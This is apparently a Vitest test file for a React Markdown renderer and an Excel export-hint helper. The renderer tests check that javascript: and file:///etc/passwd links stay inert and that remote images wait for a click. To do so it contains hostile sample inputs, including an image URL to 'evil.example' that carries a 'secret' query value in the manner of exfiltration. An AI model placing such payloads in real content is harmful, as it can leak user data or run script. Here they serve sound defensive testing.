import { describe, it, expect } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import MarkdownContent from './MarkdownContent';
import { inferReplyExportHint } from '../utils/documentExportIntent';

describe('MarkdownContent 链接与图片', () => {
  it('外链用新窗口打开（交给系统浏览器），不在主窗口导航', () => {
    const { container } = render(<MarkdownContent text={'[官网](https://example.com) 和 https://auto.example.com 和 [信](mailto:a@b.c)'} />);
    const links = [...container.querySelectorAll('a')];
    expect(links).toHaveLength(3);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  it('javascript: / file: 链接不渲染为可点击链接', () => {
    const { container } = render(<MarkdownContent text={'[x](javascript:alert(1)) [y](file:///etc/passwd)'} />);
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('x');
  });

  it('远程图片不自动加载，点击后才请求', () => {
    const { container } = render(<MarkdownContent text={'![图](https://evil.example/x.png?d=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: /evil\.example/ }));
    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://evil.example/x.png?d=secret');
  });
});

describe('inferReplyExportHint 的 Excel 判定', () => {
  it('没有真正的表格时不提供 xlsx', () => {
    expect(inferReplyExportHint('三个要点：\n1. a\n2. b', '给我一个列表')).toBeUndefined();
    expect(inferReplyExportHint('```js\nconst x = a || b || c;\n```', '')).toBeUndefined();
  });

  it('含管道表格时提供 xlsx', () => {
    expect(inferReplyExportHint('| a | b |\n|---|---|\n| 1 | 2 |', '')?.formats).toContain('xlsx');
  });
});
